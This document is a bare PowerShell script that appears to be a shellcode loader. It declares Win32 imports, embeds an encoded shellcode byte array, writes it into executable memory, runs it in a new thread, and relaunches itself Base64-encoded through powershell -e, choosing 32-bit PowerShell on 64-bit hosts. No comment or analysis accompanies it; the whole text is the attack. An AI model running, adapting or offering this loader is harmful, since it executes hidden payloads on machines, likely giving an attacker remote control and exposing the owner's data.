
$oT20 = '$mgi = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $mgi -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($oT20));$WUNH = "-e ";if([IntPtr]::Size -eq 8){$YIr = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $YIr $WUNH $e"}else{;iex "& powershell $WUNH $e";}

